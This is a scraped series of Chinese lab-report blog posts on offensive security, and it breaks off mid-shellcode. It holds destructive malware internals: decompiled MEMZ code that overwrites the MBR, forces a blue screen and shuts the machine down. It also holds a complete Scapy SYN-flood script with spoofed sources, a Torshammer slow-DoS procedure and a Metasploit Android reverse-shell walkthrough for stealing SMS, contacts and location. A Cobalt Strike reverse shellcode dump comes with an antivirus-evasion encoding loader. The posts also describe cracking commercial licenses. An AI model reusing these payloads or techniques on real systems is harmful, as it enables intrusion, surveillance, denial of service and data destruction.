GetProcAddress(LibraryA, &quot;RtlAdjustPrivilege&quot;);    NtRaiseHardError = GetProcAddress(LibraryA, &quot;NtRaiseHardError&quot;);    v6 = (void(__cdecl *)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD))NtRaiseHardError;    if (RtlAdjustPrivilege &amp;&amp; NtRaiseHardError)                               //触发蓝屏    &#123;        ((void(__cdecl *)(int, int, _DWORD, char *, int, int))RtlAdjustPrivilege)(19, 1, 0, (char *)&amp;v13 + 3, v13, v9);        v6(-1073741790, 0, 0, 0, 6, &amp;v11);    &#125;    CurrentProcess = GetCurrentProcess();    OpenProcessToken(CurrentProcess, 0x28u, &amp;v12);    LookupPrivilegeValueW(0, L&quot;SeShutdownPrivilege&quot;, &amp;v10.Privileges[0].Luid);    v10.PrivilegeCount = 1;    v10.Privileges[0].Attributes = 2;    AdjustTokenPrivileges(v12, 0, &amp;v10, 0, 0, 0);    return ExitWindowsEx(6u, 0x10007u);                                 // 关闭系统，退出Windows，关机/重启&#125;\n\n\n创建 20 个进程，随机出现在屏幕任意位置\n\n使用RtlAdjustPrivilege函数提升权限，调用NtRaiseHardError函数触发蓝屏\n\n使用SeShutdownPrivilege权限关闭系统，退出 Windows，关机&#x2F;重启，所以在此处调用sub_401021函数，监控系统中 6 个进程是否被关闭，如果被关闭，则关闭系统，退出 Windows，关机&#x2F;重启。\n\n\nsub_401000 函数分析LRESULT __stdcall sub_401000(HWND a1, UINT a2, WPARAM a3, LPARAM a4)&#123;  int savedregs; // [esp+0h] [ebp+0h] BYREF  if ( a2 != 16 &amp;&amp; a2 != 22 )    //只处理16或22的消息    return DefWindowProcW(a1, a2, a3, a4);  sub_401021((int)&amp;savedregs);  return 0;&#125;\n\n函数只处理了 16 和 22 的消息，其他消息返回 0，并调用sub_401021函数。\n在此处调用sub_401021函数，可以检测到用户是否主动关机&#x2F;重启，如果用户主动关机也会执行该函数\n所以，watchdog 部分的功能是监控进程状态和用户是否主动关机，如有发现，立即进入sub_401021函数，执行最后操作\nmain 部分分析main 函数是核心部分，首先打开物理磁盘覆盖 MBR，达到开机执行彩虹猫的效果，另一块是运行病毒出现的各种现象\n物理磁盘覆盖 MBRMBR 是一个引导程序，引导加载操作系统，所以需要覆盖掉 MBR，达到开机执行彩虹猫的效果。\nFileA = CreateFileA(&quot;\\\\\\\\.\\\\PhysicalDrive0&quot;, 0xC0000000, 3u, 0, 3u, 0, 0);    hObject = FileA;    if ( FileA == (HANDLE)-1 )      ExitProcess(2u);    v3 = 0;    v4 = LocalAlloc(0x40u, 0x10000u);    v5 = v4;    do    &#123;      ++v3;      *v5 = v5[byte_402118 - v4];      ++v5;    &#125;    while ( v3 &lt; 0x12F );    for ( i = 0; i &lt; 0x7A0; ++i )      v4[i + 510] = byte_402248[i];    if ( !WriteFile(FileA, v4, 0x10000u, &amp;NumberOfBytesWritten, 0) )      ExitProcess(3u);    CloseHandle(hObject);\n\n使用 CreateFileA 函数打开主磁盘 PhysicalDrive0，并使用 WriteFile 函数覆盖掉 MBR。\n运行病毒出现的各种现象v7 = CreateFileA(&quot;\\\\note.txt&quot;, 0xC0000000, 3u, 0, 2u, 0x80u, 0);  if ( v7 == (HANDLE)-1 )    ExitProcess(4u);  if ( !WriteFile(          v7,          &quot;YOUR COMPUTER HAS BEEN FUCKED BY THE MEMZ TROJAN.\\r\\n&quot;          &quot;\\r\\n&quot;          &quot;Your computer won&#x27;t boot up again,\\r\\n&quot;          &quot;so use it as long as you can!\\r\\n&quot;          &quot;\\r\\n&quot;          &quot;:D\\r\\n&quot;          &quot;\\r\\n&quot;          &quot;Trying to kill MEMZ will cause your system to be\\r\\n&quot;          &quot;destroyed instantly, so don&#x27;t try it :D&quot;,          0xDAu,          &amp;NumberOfBytesWritten,          0) )    ExitProcess(5u);  CloseHandle(v7);  ShellExecuteA(0, 0, &quot;notepad&quot;, &quot;\\\\note.txt&quot;, 0, 10);  v8 = 0;  v9 = (DWORD *)&amp;off_405130;  do  &#123;    Sleep(v9[1]);    CreateThread(0, 0, sub_401A2B, v9, 0, 0);    ++v8;    v9 += 2;  &#125;  while ( v8 &lt; 0xA );  while ( 1 )    Sleep(0x2710u);&#125;\n\n创建一个note.txt文件，并写入内容，然后打开note.txt文件\n接下来，创建 10 个线程，每个线程执行sub_401A2B函数，该函数会在屏幕上随机出现一些图标，并在图标上显示一些文字。\n创建完之后，进入死循环，每 10 秒暂停一次\n进入 sub_401A2B 函数void __stdcall __noreturn sub_401A2B(int (__cdecl **lpThreadParameter)(int, int))&#123;  int v1; // esi  int v2; // ebx  int i; // edi  v1 = 0;  v2 = 0;  for ( i = 0; ; ++i )  &#123;    if ( !v1-- )      v1 = (*lpThreadParameter)(v2++, i);    Sleep(0xAu);  &#125;&#125;\n\n传入 v9，每创建一个 v9 就自增 2，v9 是 Double Word，每次自增是增加 8 个字节\n1 Word&#x3D;2 Byte，Double Word &#x3D; 8 Byte&#x3D;4 Word\n查看 v9 的地址如下\n.data:00405130 off_405130      dd offset sub_4014FC    ; DATA XREF: start+1F1↑o.data:00405134                 db  30h ; 0.data:00405135                 db  75h ; u.data:00405136                 db    0.data:00405137                 db    0.data:00405138                 dd offset sub_40156D.data:0040513C                 db  30h ; 0.data:0040513D                 db  75h ; u.data:0040513E                 db    0.data:0040513F                 db    0.data:00405140                 dd offset sub_4017A5.data:00405144                 db  20h.data:00405145                 db  4Eh ; N.data:00405146                 db    0.data:00405147                 db    0.data:00405148                 dd offset sub_4016A0\n\n从初始地址 00405130 依次自增 2 个 DWORD（即 8 字节）分别变为 00405138、00405140、00405148、00405150、00405158、00405160、00405168、00405170、00405178，每个地址都对应了一个函数：sub_4014FC（初始）、sub_40156D、sub_4017A5、sub_4016A0、sub_4015D4、sub_40162A、sub_401866、sub_401688、sub_4017E9、sub_4016CD。这些函数就是导致电脑出现异常现象的元凶，这里需要逐个的分析每个函数，依次查看这些函数的伪代码\n\nsub_4014FC 函数\n\nint __cdecl sub_4014FC(int a1)&#123;  unsigned int v1; // eax  int v2; // eax  v1 = sub_401A55();  ShellExecuteA(0, &quot;open&quot;, (&amp;lpFile)[v1 % 0x2E], 0, 0, 10);  v2 = sub_401A55();  return sub_401B09(           COERCE_UNSIGNED_INT64((double)a1),           HIDWORD(COERCE_UNSIGNED_INT64((double)a1)),           (double)(v2 % 200) + 1500.0 / ((double)a1 / 15.0 + 1.0) + 100.0);&#125;\n\n该函数使用 ShellExecuteA 随机打开一个文件&#x2F;网页。双击 lpFile 进入查看。如下所示，可以看到该函数随机打开的网页和文件有哪些。\n.data:00405000 lpFile          dd offset aHttpGoogleCoCk.data:00405000                                         ; DATA XREF: sub_4014FC+18↑r.data:00405000                                         ; &quot;http://google.co.ck/search?q=best+way+t&quot;....data:00405004                 dd offset aHttpGoogleCoCk_0 ; &quot;http://google.co.ck/search?q=how+2+remo&quot;....data:00405008                 dd offset aHttpGoogleCoCk_1 ; &quot;http://google.co.ck/search?q=mcafee+vs+&quot;....data:0040500C                 dd offset aHttpGoogleCoCk_2 ; &quot;http://google.co.ck/search?q=how+to+sen&quot;....data:00405010                 dd offset aHttpGoogleCoCk_3 ; &quot;http://google.co.ck/search?q=minecraft+&quot;....data:00405014                 dd offset aHttpGoogleCoCk_4 ; &quot;http://google.co.ck/search?q=how+to+get&quot;....data:00405018                 dd offset aHttpGoogleCoCk_5 ; &quot;http://google.co.ck/search?q=bonzi+budd&quot;....data:0040501C                 dd offset aHttpGoogleCoCk_6 ; &quot;http://google.co.ck/search?q=how+2+buy+&quot;....data:00405020                 dd offset aHttpGoogleCoCk_7 ; &quot;http://google.co.ck/search?q=how+to+cod&quot;....data:00405024                 dd offset aHttpGoogleCoCk_8 ; &quot;http://google.co.ck/search?q=what+happe&quot;....data:00405028                 dd offset aHttpGoogleCoCk_9 ; &quot;http://google.co.ck/search?q=g3t+r3kt&quot;.data:0040502C                 dd offset aHttpGoogleCoCk_10 ; &quot;http://google.co.ck/search?q=batch+viru&quot;....data:00405030                 dd offset aHttpGoogleCoCk_11 ; &quot;http://google.co.ck/search?q=virus.exe&quot;.data:00405034                 dd offset aHttpGoogleCoCk_12 ; &quot;http://google.co.ck/search?q=internet+e&quot;....data:00405038                 dd offset aHttpGoogleCoCk_13 ; &quot;http://google.co.ck/search?q=facebook+h&quot;....data:0040503C                 dd offset aHttpGoogleCoCk_14 ; &quot;http://google.co.ck/search?q=virus+buil&quot;....data:00405040                 dd offset aHttpGoogleCoCk_15 ; &quot;http://google.co.ck/search?q=how+to+cre&quot;....data:00405044                 dd offset aHttpGoogleCoCk_16 ; &quot;http://google.co.ck/search?q=how+to+rem&quot;....data:00405048                 dd offset aHttpGoogleCoCk_17 ; &quot;http://google.co.ck/search?q=my+compute&quot;....data:0040504C                 dd offset aHttpGoogleCoCk_18 ; &quot;http://google.co.ck/search?q=dank+memz&quot;.data:00405050                 dd offset aHttpGoogleCoCk_19 ; &quot;http://google.co.ck/search?q=how+to+dow&quot;....data:00405054                 dd offset aHttpGoogleCoCk_20 ; &quot;http://google.co.ck/search?q=half+life+&quot;....data:00405058                 dd offset aHttpGoogleCoCk_21 ; &quot;http://google.co.ck/search?q=is+illumin&quot;....data:0040505C                 dd offset aHttpGoogleCoCk_22 ; &quot;http://google.co.ck/search?q=montage+pa&quot;....data:00405060                 dd offset aHttpGoogleCoCk_23 ; &quot;http://google.co.ck/search?q=the+memz+a&quot;....data:00405064                 dd offset aHttpGoogleCoCk_24 ; &quot;http://google.co.ck/search?q=stanky+dan&quot;....data:00405068                 dd offset aHttpGoogleCoCk_25 ; &quot;http://google.co.ck/search?q=john+cena+&quot;....data:0040506C                 dd offset aHttpGoogleCoCk_26 ; &quot;http://google.co.ck/search?q=vinesauce+&quot;....data:00405070                 dd offset aHttpGoogleCoCk_27 ; &quot;http://google.co.ck/search?q=skrillex+s&quot;....data:00405074                 dd offset aHttpAnswersMic ; &quot;http://answers.microsoft.com/en-us/prot&quot;....data:00405078                 dd offset aHttpMotherboar ; &quot;http://motherboard.vice.com/read/watch-&quot;....data:0040507C                 dd offset aHttpPlayClubpe ; &quot;http://play.clubpenguin.com&quot;.data:00405080                 dd offset aHttpPcoptimize ; &quot;http://pcoptimizerpro.com&quot;.data:00405084                 dd offset aHttpSoftonicCo ; &quot;http://softonic.com&quot;.data:00405088                 dd offset aCalc         ; &quot;calc&quot;.data:0040508C                 dd offset File          ; &quot;notepad&quot;.data:00405090                 dd offset aCmd          ; &quot;cmd&quot;.data:00405094                 dd offset aWrite        ; &quot;write&quot;.data:00405098                 dd offset aRegedit      ; &quot;regedit&quot;.data:0040509C                 dd offset aExplorer     ; &quot;explorer&quot;.data:004050A0                 dd offset aTaskmgr      ; &quot;taskmgr&quot;.data:004050A4                 dd offset aMsconfig     ; &quot;msconfig&quot;.data:004050A8                 dd offset aMspaint      ; &quot;mspaint&quot;.data:004050AC                 dd offset aDevmgmtMsc   ; &quot;devmgmt.msc&quot;.data:004050B0                 dd offset aControl      ; &quot;control&quot;.data:004050B4                 dd offset aMmc          ; &quot;mmc&quot;\n\n可以看到，该函数打开的网页和文件有很多，而且是随机的。\n\nsub_40156D 函数\n\nint __cdecl sub_40156D(int a1, int a2)&#123;  int v2; // esi  int v3; // edi  int v4; // esi  int v5; // eax  int v7; // [esp-4h] [ebp-18h]  struct tagPOINT Point; // [esp+Ch] [ebp-8h] BYREF  GetCursorPos(&amp;Point);  v2 = a2 / 2200 + 2;  v3 = sub_401A55() % v2;  v4 = sub_401A55() % v2;  v7 = Point.y + v3 * (sub_401A55() % 3 - 1);  v5 = sub_401A55();  SetCursorPos(Point.x + v4 * (v5 % 3 - 1), v7);  return 2;&#125;\n\n使用 GetCursorPos 获取当前屏幕的鼠标位置，然后在一定范围内随机取值，使用 SetCursorPos 设置新的鼠标位置，造成屏幕上鼠标抖动的现象。\n剩下的就不一一列举了。\n","categories":["QFNU","网络安全","实验报告"],"tags":["QFNU","网络安全原理实验报告","彩虹猫病毒逆向"]},{"title":"网络安全实验报告6——使用Python实现SYN Flood攻击实验","url":"/posts/8790bb83.html","content":"实验环境\n操作系统：Windows 11 23H2\n\n抓包工具：WireShark\n\n虚拟化软件：VMware Workstation 16\n\n虚拟机操作系统：Ubuntu 18.04.1\n\n\n实验过程攻击代码使用 Python 编写的实现 SYN Flood 攻击的代码：\nfrom scapy.all import *from random import randintimport threadingdef randomIP():    ip = &quot;.&quot;.join(map(str, (randint(0, 255) for _ in range(4))))    return ipdef randInt():    x = randint(1000, 9000)    return xdef SYN_Flood(dstIP, dstPort, counter):    total = 0    print(&quot;正在发送数据包……&quot;)    for x in range(0, counter):        s_port = randInt()        s_eq = randInt()        window = randInt()        IP_Packet = IP()        IP_Packet.src = randomIP()        IP_Packet.dst = dstIP        TCP_Packet = TCP()        TCP_Packet.sport = s_port        TCP_Packet.dport = dstPort        TCP_Packet.flags = &quot;S&quot;        TCP_Packet.seq = s_eq        TCP_Packet.window = window        send(IP_Packet / TCP_Packet, verbose=0)        total += 1        print(&quot;\\n该线程发送的数据包个数：%i\\n&quot; % total)def main():    dstIP, dstPort = &#x27;192.168.10.131&#x27;, 8000    num_threads = 100    counter_per_thread = 100000    threads = []    for _ in range(num_threads):        t = threading.Thread(target=SYN_Flood, args=(dstIP, dstPort, counter_per_thread))        t.start()        threads.append(t)        for t in threads:            t.join()if __name__ == &quot;__main__&quot;:    main()\n\n启动虚拟机\n查看子网名称和子网地址\n\n\n进入 Ubuntu 虚拟机，打开终端\n\n查看 IP 地址\n\n\n关闭 SYN Cookies 机制\n\n\n开启一个简易的 Web 服务\n![开启一个简易的Web服务](../images/CyberSecurity/6-SYN-flood/image-3.png)\n\n\n现在宿主主机就可以通过 IP 地址+端口号访问这个 Web 服务了。\n\n\n\n抓包\n打开 Wireshark，选择网卡，开始抓包\n\n\n编辑攻击脚本，将目标 IP 地址和端口号改为宿主主机的 IP 地址和 Web 服务的端口号\n\n\n运行攻击脚本，开始发送 SYN 包\n\n\n访问 Web 服务，查看服务器的响应情况\n\n\n停止抓包，查看攻击结果\n\n\n\n可以发现，Wireshark 捕捉到大量的 SYN 数据包，服务端由于大量的 SYN 请求，无法及时响应，导致连接超时。\n","categories":["QFNU","网络安全","实验报告"],"tags":["Python","QFNU","网络安全原理实验报告","SYN Flood攻击"]},{"title":"网络安全实验报告7——慢 DDos 拒绝服务攻击","url":"/posts/dadf3090.html","content":"安装 Java 环境下载 Java\n验证 Java 环境是否安装成功：\n\n配置环境变量\n安装 Tomcat提权\n环境变量\n新建系统变量\n\n验证 javac\n启动 Tomcat\n\n靶机安装 MySQL安装\n\n\n安装成功，启动数据库\nNavicat 安装、激活及连接安装\n激活 Navicat\n\n\n打开桌面的 Navicat，连接数据库，密码是 123456\n\n确认连接\n新建数据库\n目录部署\n运行 SQL 文件\n\n\n重启 Tomcat\n下载安装 AWVS安装完成\n运行激活软件\nAWVS 登录\n进行许可证激活\n\n\n\n输入命令以管理员身份运行 cmd，输入以下命令cacls“C:\\AWVS\\shared\\license\\license_info.json” /t /p everyone:rcacls “C:\\ProgramData\\Acunetix\\shared\\license\\wa_data.dat” /t /p everyone:r\n\n成功登录\n打开 Acunetix，添加目标查看本机地址\n添加目标\n\n\n开始扫描\n扫描结果出现威胁\n\n导出漏扫报告\n攻击机安装 Python\n利用 Torshammer 攻击安装 Torshammer\n开始攻击\n\n此时，在地址栏输入目标网站地址，已无法对该网站进行正常访问\n停止 torshammer.py 攻击进程后，即可恢复目标网站的正常访问关闭 cmd 命令窗口后，出现界面\n\n","categories":["QFNU","网络安全","实验报告"],"tags":["QFNU","网络安全原理实验报告","DDoS攻击","Java"]},{"title":"网络安全实训10——Kali远程控制Android系统","url":"/posts/d1743c61.html","content":"查看 Metasploit 工具中可以在 Android 系统下使用的 payload 类型\n\n这些 payload 可以作为我们后面攻击的软件的生成工具\n\n端口映射问题\n如果我们的手机与使用的计算机处在同一局域网，但是虚拟机使用的是 NAT 模式。那么只有我们使用的计算机才可以访问到该虚拟机，其他设备都是无法访问该虚拟机的。那么就需要端口映射了\n\n假设计算机的 IP 为（192.168.1.100）。Android 手机的 IP 为（192.168.1.*）。虚拟机的 IP 为（192.168.169.130）：\n\n第一步：打开 VMware 虚拟机网络编辑器\n\n\n\n\n第二步：设置端口的映射（设置之后，凡是发往计算机 9999 端口的流量都会转发到虚拟机的 9999 端口上，这样虚拟机就能够接收到 Android 的连接了）\n\n远程控制 Android 手机演示\n本案例中，Linux 采用桥接模式，与 Android 手机连接在同一局域网中\n\n使用 msfvenom 命令生成被控端 payload\n第一步：下面我以“android&#x2F;meterpreter&#x2F;reverse_tcp”类型的 payload 为例，然后查看该类型需要的参数（图片显示需要 IP 和端口）\n\n\n\n查看完参数之后，退出 Metasploit\n\n第二步：生成 payload（msfvenom 命令中默认没有 apk 这种格式的文件。此处使用 R 来替代-f 和-o）\n\n\n\n为软件签名\n第一步：使用 keytool 生成一个 key 文件。会让你输入该 key 的名称、单位、地址等等信息，最终生成一个 key 文件\n\n\n\n未找到命令\n安装一下\napt-get updateapt-get upgradeapt-get install openjdk-11-jdk-headless\n\n\n\n开启主动端，等待被控端连接使用msfconsole开启Metasploit\n主动端使用handler\n为handler设置参数（payload版本类型、IP地址、端口）\n开启监听（等待被控端接入）\n\n\n远程控制Android手机拍照\n远程控制Android手机录视频\n远程控制Android手机录音\n查看Android手机是否已经执行root权限\n导出Android手机的电话本我的模拟器没有联系人所以没有\n\n导出Android手机的短信记录同上\n\n远程控制目标手机发送短信\n对目标手机进行定位，查看目标手机位置信息\n","categories":["网络安全","实训","实验报告"],"tags":["网络安全实训","Kali","Android","远程控制"]},{"title":"网络安全实训11——Pyinstaller打包逆向分析火绒免杀","url":"/posts/211bc68b.html","content":"cs shellcode打开\njava -Dfile.encoding=UTF-8 -javaagent:CobaltStrikeCN.jar -XX:ParallelGCThreads=4 -XX:+AggressiveHeap -XX:+UseParallelGC -jar cobaltstrike.jar\n\n\n查看生成的 payload\n# length: 894 bytesbuf = &quot;\\xfc\\x48\\x83\\xe4\\xf0\\xe8\\xc8\\x00\\x00\\x00\\x41\\x51\\x41\\x50\\x52\\x51\\x56\\x48\\x31\\xd2\\x65\\x48\\x8b\\x52\\x60\\x48\\x8b\\x52\\x18\\x48\\x8b\\x52\\x20\\x48\\x8b\\x72\\x50\\x48\\x0f\\xb7\\x4a\\x4a\\x4d\\x31\\xc9\\x48\\x31\\xc0\\xac\\x3c\\x61\\x7c\\x02\\x2c\\x20\\x41\\xc1\\xc9\\x0d\\x41\\x01\\xc1\\xe2\\xed\\x52\\x41\\x51\\x48\\x8b\\x52\\x20\\x8b\\x42\\x3c\\x48\\x01\\xd0\\x66\\x81\\x78\\x18\\x0b\\x02\\x75\\x72\\x8b\\x80\\x88\\x00\\x00\\x00\\x48\\x85\\xc0\\x74\\x67\\x48\\x01\\xd0\\x50\\x8b\\x48\\x18\\x44\\x8b\\x40\\x20\\x49\\x01\\xd0\\xe3\\x56\\x48\\xff\\xc9\\x41\\x8b\\x34\\x88\\x48\\x01\\xd6\\x4d\\x31\\xc9\\x48\\x31\\xc0\\xac\\x41\\xc1\\xc9\\x0d\\x41\\x01\\xc1\\x38\\xe0\\x75\\xf1\\x4c\\x03\\x4c\\x24\\x08\\x45\\x39\\xd1\\x75\\xd8\\x58\\x44\\x8b\\x40\\x24\\x49\\x01\\xd0\\x66\\x41\\x8b\\x0c\\x48\\x44\\x8b\\x40\\x1c\\x49\\x01\\xd0\\x41\\x8b\\x04\\x88\\x48\\x01\\xd0\\x41\\x58\\x41\\x58\\x5e\\x59\\x5a\\x41\\x58\\x41\\x59\\x41\\x5a\\x48\\x83\\xec\\x20\\x41\\x52\\xff\\xe0\\x58\\x41\\x59\\x5a\\x48\\x8b\\x12\\xe9\\x4f\\xff\\xff\\xff\\x5d\\x6a\\x00\\x49\\xbe\\x77\\x69\\x6e\\x69\\x6e\\x65\\x74\\x00\\x41\\x56\\x49\\x89\\xe6\\x4c\\x89\\xf1\\x41\\xba\\x4c\\x77\\x26\\x07\\xff\\xd5\\x48\\x31\\xc9\\x48\\x31\\xd2\\x4d\\x31\\xc0\\x4d\\x31\\xc9\\x41\\x50\\x41\\x50\\x41\\xba\\x3a\\x56\\x79\\xa7\\xff\\xd5\\xeb\\x73\\x5a\\x48\\x89\\xc1\\x41\\xb8\\xff\\xff\\x00\\x00\\x4d\\x31\\xc9\\x41\\x51\\x41\\x51\\x6a\\x03\\x41\\x51\\x41\\xba\\x57\\x89\\x9f\\xc6\\xff\\xd5\\xeb\\x59\\x5b\\x48\\x89\\xc1\\x48\\x31\\xd2\\x49\\x89\\xd8\\x4d\\x31\\xc9\\x52\\x68\\x00\\x02\\x40\\x84\\x52\\x52\\x41\\xba\\xeb\\x55\\x2e\\x3b\\xff\\xd5\\x48\\x89\\xc6\\x48\\x83\\xc3\\x50\\x6a\\x0a\\x5f\\x48\\x89\\xf1\\x48\\x89\\xda\\x49\\xc7\\xc0\\xff\\xff\\xff\\xff\\x4d\\x31\\xc9\\x52\\x52\\x41\\xba\\x2d\\x06\\x18\\x7b\\xff\\xd5\\x85\\xc0\\x0f\\x85\\x9d\\x01\\x00\\x00\\x48\\xff\\xcf\\x0f\\x84\\x8c\\x01\\x00\\x00\\xeb\\xd3\\xe9\\xe4\\x01\\x00\\x00\\xe8\\xa2\\xff\\xff\\xff\\x2f\\x54\\x46\\x4e\\x75\\x00\\xaa\\x70\\x9b\\x7f\\x7e\\xe2\\x64\\x6f\\xcc\\x10\\x1b\\x90\\x61\\x03\\x39\\x80\\xc8\\xa5\\x0d\\x12\\x17\\x65\\xdb\\x19\\x76\\x54\\xe5\\xc9\\xad\\xb7\\xfd\\xd9\\x13\\x72\\x8a\\xdd\\x13\\xc9\\xc1\\x62\\x89\\xeb\\xe4\\x0a\\xb6\\xcc\\xc3\\x4d\\x97\\xf0\\xc4\\xd2\\x8a\\x1a\\x4c\\x52\\x5c\\x04\\xb1\\xaa\\xc5\\x42\\xaf\\x31\\xef\\x1e\\xb7\\x0a\\xf5\\xd3\\xea\\x7a\\x58\\x00\\x55\\x73\\x65\\x72\\x2d\\x41\\x67\\x65\\x6e\\x74\\x3a\\x20\\x4d\\x6f\\x7a\\x69\\x6c\\x6c\\x61\\x2f\\x34\\x2e\\x30\\x20\\x28\\x63\\x6f\\x6d\\x70\\x61\\x74\\x69\\x62\\x6c\\x65\\x3b\\x20\\x4d\\x53\\x49\\x45\\x20\\x35\\x2e\\x30\\x3b\\x20\\x57\\x69\\x6e\\x64\\x6f\\x77\\x73\\x20\\x4e\\x54\\x3b\\x20\\x44\\x69\\x67\\x45\\x78\\x74\\x3b\\x20\\x44\\x54\\x53\\x20\\x41\\x67\\x65\\x6e\\x74\\x0d\\x0a\\x00\\x12\\xfb\\x77\\xa2\\x83\\x3b\\xab\\x20\\x14\\xd0\\xde\\x97\\xd9\\x52\\xe5\\x7d\\x73\\xb4\\xab\\x85\\xba\\x6e\\xd4\\xca\\xdc\\xce\\x99\\x2b\\xd7\\x24\\xfa\\x5f\\x68\\x01\\x8f\\x5d\\xbc\\x23\\x11\\x8d\\x31\\x7e\\x54\\x6f\\x0e\\xe6\\x07\\xe7\\x6a\\x34\\x3a\\xce\\x13\\x09\\xa1\\xc4\\xe0\\x28\\xde\\xaf\\x4e\\xf5\\xa8\\x0f\\x01\\xe7\\x48\\x8f\\x23\\x42\\x4c\\xd6\\x08\\x08\\x01\\xfa\\x3e\\x7d\\x48\\xef\\x29\\x1b\\x72\\xf3\\x70\\x01\\xdd\\x6d\\x9c\\x64\\x5b\\x51\\x66\\xef\\x59\\x59\\x9d\\xba\\x70\\xf4\\x03\\xa4\\xad\\x9d\\x2d\\xe2\\x57\\xcb\\x89\\x36\\x26\\x70\\x67\\xd7\\x17\\x48\\x10\\xf5\\x34\\x28\\x37\\x89\\xe5\\xc6\\xc2\\xf5\\x3d\\x75\\x9a\\xc7\\x0b\\xaf\\xac\\xa6\\xea\\xc4\\x9f\\x18\\x25\\x79\\x68\\x88\\x59\\x41\\x6e\\x22\\x18\\x63\\x52\\xf8\\xca\\x55\\x6b\\xf4\\x77\\xa2\\x77\\xb1\\x18\\x68\\xd6\\xb0\\xd8\\xfc\\xdf\\x7d\\x5d\\xbc\\x14\\x09\\x56\\x98\\xc9\\x70\\x82\\x40\\x05\\xf5\\x84\\xf4\\x86\\x0d\\xf0\\x6e\\x52\\x85\\xa9\\x0a\\x8f\\xbc\\x22\\x82\\xb9\\x25\\xbf\\x70\\x90\\x96\\xb2\\xb7\\x63\\xc4\\xba\\x85\\x97\\x4f\\xca\\x8d\\x92\\xec\\x07\\xa7\\xbb\\xbd\\xe7\\x1f\\x83\\xe7\\xc7\\x5c\\x1f\\x08\\x0b\\xad\\x00\\x41\\xbe\\xf0\\xb5\\xa2\\x56\\xff\\xd5\\x48\\x31\\xc9\\xba\\x00\\x00\\x40\\x00\\x41\\xb8\\x00\\x10\\x00\\x00\\x41\\xb9\\x40\\x00\\x00\\x00\\x41\\xba\\x58\\xa4\\x53\\xe5\\xff\\xd5\\x48\\x93\\x53\\x53\\x48\\x89\\xe7\\x48\\x89\\xf1\\x48\\x89\\xda\\x41\\xb8\\x00\\x20\\x00\\x00\\x49\\x89\\xf9\\x41\\xba\\x12\\x96\\x89\\xe2\\xff\\xd5\\x48\\x83\\xc4\\x20\\x85\\xc0\\x74\\xb6\\x66\\x8b\\x07\\x48\\x01\\xc3\\x85\\xc0\\x75\\xd7\\x58\\x58\\x58\\x48\\x05\\x00\\x00\\x00\\x00\\x50\\xc3\\xe8\\x9f\\xfd\\xff\\xff\\x31\\x39\\x32\\x2e\\x31\\x36\\x38\\x2e\\x31\\x38\\x39\\x2e\\x31\\x33\\x30\\x00\\x12\\x34\\x56\\x78&quot;\n\n\n\n直接运行，cs 直接上线\n\n\nshellcode 免杀这里采用 base32+base64 编码进行免杀\n# -*- encoding: utf-8 -*-# Time : 2021/04/29 11:19:04# Author: crowimport ctypesimport base64shellcode = b&quot;&quot;# length: 894 bytesshellcode = b&quot;\\xfc\\x48\\x83\\xe4\\xf0\\xe8\\xc8\\x00\\x00\\x00\\x41\\x51\\x41\\x50\\x52\\x51\\x56\\x48\\x31\\xd2\\x65\\x48\\x8b\\x52\\x60\\x48\\x8b\\x52\\x18\\x48\\x8b\\x52\\x20\\x48\\x8b\\x72\\x50\\x48\\x0f\\xb7\\x4a\\x4a\\x4d\\x31\\xc9\\x48\\x31\\xc0\\xac\\x3c\\x61\\x7c\\x02\\x2c\\x20\\x41\\xc1\\xc9\\x0d\\x41\\x01\\xc1\\xe2\\xed\\x52\\x41\\x51\\x48\\x8b\\x52\\x20\\x8b\\x42\\x3c\\x48\\x01\\xd0\\x66\\x81\\x78\\x18\\x0b\\x02\\x75\\x72\\x8b\\x80\\x88\\x00\\x00\\x00\\x48\\x85\\xc0\\x74\\x67\\x48\\x01\\xd0\\x50\\x8b\\x48\\x18\\x44\\x8b\\x40\\x20\\x49\\x01\\xd0\\xe3\\x56\\x48\\xff\\xc9\\x41\\x8b\\x34\\x88\\x48\\x01\\xd6\\x4d\\x31\\xc9\\x48\\x31\\xc0\\xac\\x41\\xc1\\xc9\\x0d\\x41\\x01\\xc1\\x38\\xe0\\x75\\xf1\\x4c\\x03\\x4c\\x24\\x08\\x45\\x39\\xd1\\x75\\xd8\\x58\\x44\\x8b\\x40\\x24\\x49\\x01\\xd0\\x66\\x41\\x8b\\x0c\\x48\\x44\\x8b\\x40\\x1c\\x49\\x01\\xd0\\x41\\x8b\\x04\\x88\\x48\\x01\\xd0\\x41\\x58\\x41\\x58\\x5e\\x59\\x5a\\x41\\x58\\x41\\x59\\x41\\x5a\\x48\\x83\\xec\\x20\\x41\\x52\\xff\\xe0\\x58\\x41\\x59\\x5a\\x48\\x8b\\x12\\xe9\\x4f\\xff\\xff\\xff\\x5d\\x6a\\x00\\x49\\xbe\\x77\\x69\\x6e\\x69\\x6e\\x65\\x74\\x00\\x41\\x56\\x49\\x89\\xe6\\x4c\\x89\\xf1\\x41\\xba\\x4c\\x77\\x26\\x07\\xff\\xd5\\x48\\x31\\xc9\\x48\\x31\\xd2\\x4d\\x31\\xc0\\x4d\\x31\\xc9\\x41\\x50\\x41\\x50\\x41\\xba\\x3a\\x56\\x79\\xa7\\xff\\xd5\\xeb\\x73\\x5a\\x48\\x89\\xc1\\x41\\xb8\\xff\\xff\\x00\\x00\\x4d\\x31\\xc9\\x41\\x51\\x41\\x51\\x6a\\x03\\x41\\x51\\x41\\xba\\x57\\x89\\x9f\\xc6\\xff\\xd5\\xeb\\x59\\x5b\\x48\\x89\\xc1\\x48\\x31\\xd2\\x49\\x89\\xd8\\x4d\\x31\\xc9\\x52\\x68\\x00\\x02\\x40\\x84\\x52\\x52\\x41\\xba\\xeb\\x55\\x2e\\x3b\\xff\\xd5\\x48\\x89\\xc6\\x48\\x83\\xc3\\x50\\x6a\\x0a\\x5f\\x48\\x89\\xf1\\x48\\x89\\xda\\x49\\xc7\\xc0\\xff\\xff\\xff\\xff\\x4d\\x31\\xc9\\x52\\x52\\x41\\xba\\x2d\\x06\\x18\\x7b\\xff\\xd5\\x85\\xc0\\x0f\\x85\\x9d\\x01\\x00\\x00\\x48\\xff\\xcf\\x0f\\x84\\x8c\\x01\\x00\\x00\\xeb\\xd3\\xe9\\xe4\\x01\\x00\\x00\\xe8\\xa2\\xff\\xff\\xff\\x2f\\x54\\x46\\x4e\\x75\\x00\\xaa\\x70\\x9b\\x7f\\x7e\\xe2\\x64\\x6f\\xcc\\x10\\x1b\\x90\\x61\\x03\\x39\\x80\\xc8\\xa5\\x0d\\x12\\x17\\x65\\xdb\\x19\\x76\\x5